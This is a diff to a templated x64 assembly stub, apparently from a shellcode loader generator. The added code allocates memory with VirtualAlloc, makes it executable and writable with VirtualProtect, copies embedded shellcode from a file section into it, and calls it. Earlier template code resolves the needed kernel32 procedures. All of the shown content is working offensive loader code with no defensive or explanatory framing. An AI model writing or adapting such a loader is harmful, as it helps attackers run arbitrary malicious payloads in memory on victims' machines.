@@ -8,8 +8,7 @@
 // r14 store address of VirtualProtect
 // r15 store address of CreateThread
 
-entry:
-  // find CreateThread, VirtualAlloc and VirtualProtect
+// get core procedure address
 {{if .LackProcedure}}
   // push kernel32 module name to stack
   mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}
@@ -171,4 +170,46 @@ entry:
 
 {{end}}
 
-  int3
+// allocate memory for shellcode
+xor rcx, rcx
+mov rdx, {{hex .MemRegionSize}}
+mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
+mov r9, 0x04    // PAGE_READWRITE
+sub rsp, 0x20
+call {{.RegN.r13}}
+add rsp, 0x20
+
+// store allocated memory address
+push rax
+
+// adjust memory region protect
+sub rsp, 0x08 // for store old protect
+mov rcx, rax
+mov rdx, {{hex .MemRegionSize}}
+mov r8, 0x40 // PAGE_EXECUTE_READWRITE
+mov r9, rsp
+sub rsp, 0x20
+call {{.RegN.r14}}
+add rsp, 0x20
+add rsp, 0x08 // restore stack
+
+// read shellcode from section or instructions
+{{if .SectionMode}}
+  mov rsi, {{.RegN.rdi}}
+  add rsi, {{hex .SectionOffset}}
+  mov rdi, [rsp]
+  mov rcx, {{hex .ShellcodeSize}}
+  cld
+  rep movsb
+{{else}}
+
+{{end}}
+
+// call the shellcode
+mov rax, [rsp] // allocated memory address
+add rsp, 0x08  // restore stack
+sub rsp, 0x20
+call rax
+add rsp, 0x20
+
+int3
